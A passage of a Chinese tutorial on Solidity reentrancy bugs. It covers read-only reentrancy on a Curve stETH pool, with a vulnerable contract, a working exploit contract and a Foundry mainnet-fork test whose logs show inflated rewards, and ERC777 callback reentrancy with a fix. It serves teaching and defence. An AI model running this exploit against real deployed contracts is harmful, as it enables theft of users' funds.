        status = 0;
    }

    /// @notice 提取指定数量的 ETH
    /// @param _weiToWithdraw 要提取的 wei 数量
    function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {
        // ...
    }
}
```

方式二：使用检查-效果-交互模式

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title 修复后的银行合约
/// @notice 采用 Checks-Effects-Interactions 模式，避免重入漏洞
contract EtherStoreRemediated {
    /// @notice 记录每个地址存入的 ETH 数量
    mapping(address => uint256) public balances;
}
```

方式三：使用 transfer 或 send 来进行转账

这两个函数存在限制仅被运行最多使用2300GAS，这些GAS不足以攻击者发起重入攻击。

## （五）只读重入漏洞

### 1、漏洞解析

一种特殊的重入漏洞，它利用的是在调用了外部合约后，未及时更新关键参数。导致攻击者能够利用未更新的参数来进行攻击， 合约可能会根据返回的数据做出关键决策，从而导致意想不到的后果。只读重入漏洞往往出现在合约A调用另一个合约B，A的关键参数未及时更新，攻击者利用这个时间窗口，构造回调函数（receive或者fallback）来读取旧的参数，实现获利，因为需要多个合约配合，所以也被称为跨合约重入漏洞。

### 2、代码解析

  以下设置了一个虚拟的 Curve 流动池来还原只读重入漏洞，里面存在getReward只读方法
  Curve：Curve (CRV)。这是一个稳定币交易平台，可以将各种稳定币相互转换

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title Curve 协议部分接口
/// @notice Curve 是一个去中心化的流动池协议，此处抽象出部分方法供调用
interface ICurve {
    /// @notice 获得虚拟价格
    function get_virtual_price() external view returns (uint256);

    /// @notice 添加流动性，期望获得 LP 代币
    /// @param amounts 各币种存入数量
    /// @param min_mint_amount 最少接受的 LP 代币数量（滑点保护）
    function add_liquidity(
        uint256[2] calldata amounts,
        uint256 min_mint_amount
    ) external payable returns (uint256);

    /// @notice 移除流动性，期望获得 XX 个 A 代币和 XX 个 B 代币
    /// @param lp 要销毁的 LP 代币数量
    /// @param min_amounts 各币种最少接受的返还数量（滑点保护）
    function remove_liquidity(
        uint256 lp,
        uint256[2] calldata min_amounts
    ) external returns (uint256[2] memory);

    /// @notice 移除单一币种的流动性
    /// @param lp 要销毁的 LP 代币数量
    /// @param i 目标币种的索引
    /// @param min_amount 最少接受的返还数量（滑点保护）
    function remove_liquidity_one_coin(
        uint256 lp,
        int128 i,
        uint256 min_amount
    ) external returns (uint256);
}

/// @title 质押/赎回服务合约
/// @notice 利用 Curve 流动池的算法，为用户提供质押和赎回服务
contract VulnContract {
    /// @notice stETH 流动池地址
    address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    /// @notice steCRV LP Token 地址（存入两种代币后获得的流动池代币）
    address constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E;

    /// @notice 实例化流动池接口
    ICurve private constant pool = ICurve(STETH_POOL);

    /// @notice 实例化 LP Token 接口
    IERC20 public constant token = IERC20(LP_TOKEN);

    /// @notice 记录每个地址质押的 LP 代币数量
    mapping(address => uint256) public balanceOf;

    /// @notice 质押 LP 代币
    /// @param amount 质押数量
    function stake(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender] += amount;
    }

    /// @notice 赎回 LP 代币
    /// @param amount 赎回数量
    function unstake(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }

    /// @notice 获取奖励（只读方法）
    /// @return reward 用户当前可获得的奖励
    function getReward() external view returns (uint256) {
        // 查询价格，以用户代币数量与当前价格计算奖励
        uint256 reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /
            1 ether;
        // 省略转移奖励的代码；若实现了转移奖励，则本合约不再是只读合约
        return reward;
    }
}
```

这里面涉及到很多容易不懂的名词了，所以科普一下：

代币：区块链上的"游戏币"或"积分"。`IERC20` 就是一种"标准代币"，像"全国通用的游戏币"，任何支持这个标准的钱包、交易所都能识别。以太坊上最常见的代币标准叫 **ERC20**。

稳定币：价格钉住美元（约 1 美元）的代币，不像比特币那样暴涨暴跌，最出名的是 **USDT、USDC**。

质押：把币锁进一个合约里，换取某种好处（利息、凭证、投票权等），比如存利息，押金，存包柜。

LP 代币：你往资金池里"存钱"后，拿到的存款凭证。 Liquidity Provider ，不想存了用 LP 代币去赎回

虚拟价格：1 个 LP 代币现在值多少钱，由池子里的总资产除以 LP 代币总量算出来。

滑点保护：设置一个**"最少能接受多少"**的底线，比如去换外汇的时候，牌价写着 1 美元换 7 块人民币，但你真去换时，因为手续费、行情波动，可能只能换到 6.9 块，**滑点**就是 7 → 6.9 这个差距，**滑点保护**就是你说："低于 6.95 我就不换了"。**为什么重要**：区块链上交易从提交到确认有几秒延迟，价格可能被别人抢先操作而变动。没有滑点保护，你可能以极差的价格成交。

stETH：质押了 ETH 之后拿到的凭证，由 Lido 这个项目发行。**st** = staked（已质押的）

steCRV= **st**ETH + **e**TH + **CRV**（Curve 的治理代币名）

一句话故事串联一下：假设你是小美，你有 1 个 ETH，想赚点利息 → 存进 **Lido** → 拿到 **1 个 stETH**（质押凭证）。你发现 Curve 上有个 **stETH 池子**，专门换 ETH 和 stETH，交易的人多，能赚手续费 → 你把 **1 ETH + 1 stETH** 存进这个池子。池子给你 **2 个 steCRV（LP 代币）**，作为"你存了钱"的**凭证**。这个池子因为交易活跃，**虚拟价格**从 1.0 涨到 1.05 → 意味着你的 2 个 steCRV 现在值 **2.1 个币**。你随时可以用 steCRV **赎回**你的币，赎回时设置 **min_amounts** 做**滑点保护**，防止被坑。

https://etherscan.io/address/0xDC24316b9AE028F1497c275EB9192a3Ea0f67022#code记录了一个例子：

**ETH/stETH 稳定币兑换池**

![1789961692454](../../web3/media/1789961692454.png)

丢给AI问了一下大致的内容：

![1789969841573](../../web3/media/1789969841573.png)

![1789970129309](../../web3/media/1789970129309.png)

我觉得这个币池的描述也很好，黏贴一下：

```
币池是一个很大的交易市场，就像一个水果市场，苹果和橘子价格长期是比率是1:1，这天苹果丰收，因此苹果和橘子比率变为2:1，此时有外来的商人来带来橘子，又把苹果和橘子比率变为1:1，此时的外来就是增加流动性，商人也因此获得了收益(LP TOKEN : liquidity providers）。  LP可以换回橘子和苹果。
```

```java
// 攻击exp
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title 只读重入攻击（Read-Only Reentrancy）演示合约
/// @notice 利用 Curve 池子在 remove_liquidity 期间虚拟价格暂时失真的特性，
///         在 receive() 回调中读取被操纵的 get_virtual_price()，从而骗取奖励
contract ExploitContract {
    /// @notice Curve ETH/stETH 池接口实例
    ICurve private constant pool = ICurve(STETH_POOL);

    /// @notice LP Token（steCRV）接口实例
    IERC20 public constant lpToken = IERC20(LP_TOKEN);

    /// @notice 被攻击的目标合约（VulnContract）
    VulnContract private immutable target;

    /// @param _target 目标合约地址
    constructor(address _target) {
        target = VulnContract(_target);
    }

    /// @notice 向 Curve 池子添加流动性，并将获得的 LP 代币质押到目标合约
    /// @dev 调用时需附带 ETH，msg.value 全部作为 ETH 侧流动性
    function stakeTokens() external payable {
        uint256[2] memory amounts = [msg.value, 0];

        // 添加流动性，获得 LP 代币数量
        uint256 lp = pool.add_liquidity{value: msg.value}(amounts, 1);

        console.log(
            "LP token price after staking into VulnContract",
            pool.get_virtual_price()
        );

        // 将获得的 LP 代币质押到目标合约
        lpToken.approve(address(target), lp);
        target.stake(lp);
    }

    /// @notice 执行只读重入攻击
    /// @dev 通过 remove_liquidity 触发 receive() 回调，
    ///      在回调中读取被暂时压低的虚拟价格，骗取超额奖励
    function performReadOnlyReentrancy() external payable {
        // 添加流动性
        uint256[2] memory amounts = [msg.value, 0];
        uint256 lp = pool.add_liquidity{value: msg.value}(amounts, 1);

        // 查询当前 LP Token 价格
        console.log(
            "LP token price before remove_liquidity()",
            pool.get_virtual_price()
        );

        // 移除流动性：remove_liquidity() 会触发本合约的 receive() 回调
        uint256[2] memory min_amounts = [uint256(0), uint256(0)];
        pool.remove_liquidity(lp, min_amounts);

        console.log(
            "--------------------------------------------------------------------"
        );

        // 查看此时 LP Token 价格
        console.log(
            "LP token price after remove_liquidity()",
            pool.get_virtual_price()
        );

        // 查看可获取的奖励
        uint256 reward = target.getReward();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", reward);
    }

    /// @notice 接收 ETH 时自动调用
    /// @dev remove_liquidity 执行期间会触发此回调，
    ///      此时 Curve 池子的虚拟价格尚未恢复，可读取到失真值
    receive() external payable {
        console.log(
            "--------------------------------------------------------------------"
        );

        // 查看此时 LP Token 价格（被操纵中的价格）
        console.log(
            "LP token price during remove_liquidity()",
            pool.get_virtual_price()
        );

        // 查看此时可获取的奖励（被虚高的奖励）
        uint256 reward = target.getReward();
        console.log("Reward if Read-Only Reentrancy is invoked: ", reward);
    }
}

/// @title 攻击测试合约
/// @notice 使用 Foundry 的 fork 测试，在主网分叉环境下复现只读重入攻击
contract ExploitTest is Test {
    ExploitContract public hack;
    VulnContract public target;

    function setUp() public {
        vm.createSelectFork("mainnet");
        target = new VulnContract();                       // 部署交易所合约
        hack = new ExploitContract(address(target));       // 部署攻击合约
    }

    function testPwn() public {
        // 先向目标合约质押 10 ether
        hack.stakeTokens{value: 10 ether}();

        // 再发起只读重入攻击，附带 100000 ether
        hack.performReadOnlyReentrancy{value: 100000 ether}();
    }
}
```

### 3、漏洞复现

这边是直接在foundary上部署的，但这个测试需要 fork 以太坊主网，但仓库 `foundry.toml` 里配置的默认 RPC（`rpc.ankr.com`）现在要求 API Key，匿名访问被拒绝了。这不是代码的问题，是公共 RPC 服务策略变了

所以要换成自己免费的rpc

https://app.infura.io/我用的这个平台，注册后得到api key，改这个`foundry.toml`

![1789975058358](../../web3/media/1789975058358.png)

或者：**国内通常能直接连**的公共 RPC

```bash
# 逐个测试哪个能通
cast block-number --rpc-url https://eth.llamarpc.com
cast block-number --rpc-url https://rpc.ankr.com/eth   # 我这里就这个通不了
cast block-number --rpc-url https://ethereum.publicnode.com
cast block-number --rpc-url https://1rpc.io/eth
cast block-number --rpc-url https://rpc.flashbots.net
```

![1789975772075](../../web3/media/1789975772075.png)

然后就能很清晰得看整个过程了，说明一下这个Logs文件

测试输出了 5 行日志，核心是**三次读取虚拟价格**和**两次计算奖励**：

| 阶段                         | 虚拟价格                 | 含义                 |
| ---------------------------- | ------------------------ | -------------------- |
| 质押后                       | `1.142936092710230159`   | 正常价格             |
| 移除流动性**前**             | `1.142957351883905021`   | 正常价格（略涨）     |
| **移除流动性期间（回调中）** | **1.567698646280020044** | **被操纵的虚高价格** |
| 移除流动性**后**             | `1.142957351883905021`   | 恢复正常             |

对应的奖励：

| 阶段                 | 奖励                                   |
| -------------------- | -------------------------------------- |
| **重入期间**读到的   | `13716406183750144984`（约 **13.72**） |
| **正常情况下**应得的 | `10000179132860483858`（约 **10.00**） |

**关键结论**：攻击者在 `receive()` 回调里读到的价格是 **1.5677**，比正常价格 **1.1429** 高出约 **37%**，导致算出的奖励虚高约 **37%**。

---

逐行解读一下：

第 1 行：质押 10 ETH 后

text

```
LP token price after staking into VulnContract 1142936092710230159
```

- 攻击合约调用 `stakeTokens{value: 10 ether}()`。
- 向 Curve 池子添加 10 ETH 流动性。
- 拿到 `8749389569416098438` 个 LP 代币（约 8.749 个）。
- 此时虚拟价格 = `1.1429...`。

**含义**：正常操作，价格正常。

---

第 2 行：移除流动性前

text

```
LP token price before remove_liquidity() 1142957351883905021
```

- 攻击合约调用 `performReadOnlyReentrancy{value: 100000 ether}()`。
- 先向 Curve 池子添加 **100000 ETH** 流动性。
- 拿到 `87424812565355924459475` 个 LP 代币（约 87424 个）。
- 此时虚拟价格 = `1.1429...`（几乎没变）。

**含义**：加大量流动性后，价格**只涨了极小一点点**（1.1429360 → 1.1429573），符合正常 AMM 行为。

---

第 3 行：移除流动性**期间**（回调中）

text

```
LP token price during remove_liquidity() 1567698646280020044
```

- 攻击合约调用 `pool.remove_liquidity(lp, [0, 0])`。
- Curve 销毁 LP，开始向攻击合约**转 ETH**。
- 转账触发攻击合约的 `receive()` 回调。
- **在回调里**调用 `pool.get_virtual_price()` → **1.5677**。

**这是漏洞的核心窗口。**

**为什么价格会虚高？**

用大白话解释 Curve `remove_liquidity` 的执行顺序：

text

```
1. 销毁 LP（totalSupply 减少）        ← 先做
2. 计算应返还的 ETH 数量
3. 转 ETH 给调用者  → 触发 receive()   ← 此时 balances 还没减
4. 更新 balances（ETH 余额减少）       ← 最后才做
```

在第 3 步和第 4 步之间：

- `totalSupply` **已经减少**（LP 被销毁了）。
- `balances`（池子里的 ETH 数量）**还没减少**。

`get_virtual_price() = D / totalSupply`，分母变小、分子没变 → **价格虚高**。

日志里数字印证：

- 正常时：`1.1429`
- 回调中：`1.5677`
- 恢复正常：`1.1429`

---

第 4 行：重入期间算出的奖励

text

```
Reward if Read-Only Reentrancy is invoked:  13716406183750144984
```

- 在 `receive()` 回调里，攻击合约调用 `target.getReward()`。
- `VulnContract.getReward()` 内部又调用 `pool.get_virtual_price()`。
- 因为此刻价格是 **1.5677**（虚高），算出的奖励 = `balanceOf × 1.5677 / 1e18` ≈ **13.72**。

**对比正常奖励 10.00，虚高了约 37%。**

---

第 5 行：移除流动性结束后

text

```
LP token price after remove_liquidity() 1142957351883905021
Reward if Read-Only Reentrancy is not invoked:  10000179132860483858
```

- `remove_liquidity` 执行完毕，`balances` 更新完成。
- 虚拟价格**恢复正常** = `1.1429`。
- 再调 `getReward()` → 奖励 = **10.00**（正常值）。

**这一步是"事后对照"**：证明价格只是**暂时**失真，攻击窗口只在回调期间存在。

------

只读重读的攻击步骤核心为：

  1、存入大量流动资金。

  2、消除流动性。

  3、在回调期间执行恶意活动。

  4、获得差价利润。

## （六）ERC777代币回调攻击

### 1、漏洞解析

首先明确，这也是一种典型的重入漏洞

先弄懂ERC777 和 ERC20 的关系

**ERC20**：最基础的代币标准，像"游戏币"，只能做最简单的操作——转账、查余额、授权别人花你的币。

**ERC777**：在 ERC20 基础上**加了两个"通知功能"**，让代币在转账时能**自动通知双方合约**。

用生活类比：

|          | ERC20                                  | ERC777                                           |
| -------- | -------------------------------------- | ------------------------------------------------ |
| 转账     | 你悄悄把钱塞进对方口袋，对方**不知道** | 你转账时，**先跟对方打个招呼**，对方可以**拒收** |
| 合约收款 | 钱到了，合约**不知道谁给的、给了多少** | 合约**自动收到通知**，知道是谁、给了多少         |
| 附带信息 | 不能带备注                             | 可以带**备注**（data 字段）                      |

**ERC777 的核心卖点**：让合约能"感知"到收付款，不用像 ERC20 那样先 `approve` 再 `transferFrom`（两步操作）。

两个回调函数：

函数 1：`tokensToSend`——"我要转钱了，先通知我一声"  

什么时候调用**：**转账之前**，由**发送方**的合约调用。

函数2：`tokensReceived`——"我收到钱了，通知我一声"

什么时候调用：**转账之后**，由**接收方**的合约调用。



**但是这两个钩子会引发重入攻击。**

- `tokensReceived` 在**转账过程中**被调用。攻击者可以在 `tokensReceived` 里**再次调用**代币合约的转账函数。
- 如果代币合约**没有防重入锁**，就可能被反复调用，导致余额计算错误、超额提款。

**类比**：

- 你去银行取钱，柜员先给你钱，再扣你账户余额。
- 你拿到钱后，**立刻又跑去另一个柜台取一次**（因为余额还没扣）。
- 反复几次，你就把银行掏空了。

**真实案例**：2020 年 **imBTC（ERC777 代币）** 被重入攻击，Uniswap 和 dForce 损失惨重。2022 年 **Cream Finance** 也因 ERC777 重入被攻击。

### 2、代码解析

**先造币**：一个 ERC777 代币，带 `Mint`，随便印。

**再搭银行**：一个 `Bank` 合约，专门收这种币。

**银行去登记**：ERC1820 是链上"公共登记处"，任何地址都能去登记。`Bank` 登记了 `tokensRecipient` 接口，从此**虽然自己不是 ERC777 代币，但收到币时能触发自定义逻辑**。

**留了个后门**：`Bank.claim` 没做重入检查。

**攻击者照抄**：攻击者也去登记 `tokensReceived`，在回调里**再次调用 claim**，反复薅羊毛。

**一句话**：钩子让合约能"感知"收币，但也让攻击者能"趁虚而入"。

### 3、漏洞利用

```bash
forge test --contracts ./src/test/ERC777-reentrancy.sol -vvvv
```

代码一共存在三个合约，MYERC777，这个没什么好说的就是初始化了一个ERC777代币合约

SimpleBank这个合约主要的功能是允许每个用户领取（claim）最大不超过1000的ERC777代币，并且通过注册ERC1820来去实现了ERC777的tokensReceived方法，使其该合约具备ERC777代币的特性，虽然在本案例中的tokensReceived并没有进行其他的逻辑操作。

ContractTest这个合约是EXP合约，主要是testERC777Reentrancy方法利用和tokensReceived回调，逻辑也非常简单：合约调用claim领取900个代币，之后合约收到900个代币触发 tokensReceived，攻击者在 tokensReceived函数里再次调用了claim。

最终利用该重入成功获取了900+1000=1900的代币，原本该ERC777只允许最大mint1000个代币，原因就在于claim（存在漏洞，未进行重入锁以及未遵循检查-效果-交互）

![1790006910733](../../web3/media/1790006910733.png)

### 4、漏洞修复

  ERC777回调函数攻击方式和普通的重入漏洞没有大的差异，修复方式就是增加重入锁。

  发现claim函数并未遵循"检查-效果-交互"模式，修改代码

```java
function claim(address account, uint256 amount) public returns (bool) {
    // ① 检查（Checks）
    require(
        _mints[account] + amount <= maxMintsPerAddress,
        "Exceeds max mints per address"
    );

    // ② 效果（Effects）：先更新状态
    _mints[account] += amount;

    // ③ 交互（Interactions）：后转账
    token.transfer(account, amount);

    return true;
}
```

